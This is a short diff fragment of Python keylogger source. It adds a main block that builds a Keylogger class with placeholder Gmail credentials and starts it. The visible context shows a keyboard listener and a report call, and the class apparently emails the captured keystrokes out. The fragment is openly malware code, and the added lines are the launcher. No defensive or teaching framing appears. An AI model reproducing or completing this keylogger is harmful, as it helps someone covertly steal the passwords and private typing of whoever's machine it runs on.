@@ -48,3 +48,10 @@ class Keylogger:
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
+
+
+if __name__ == "__main__":
+    mail = "email@gmail.com"
+    pwd = "password"
+    keylogger = Keylogger(mail, pwd)
+    keylogger.start()
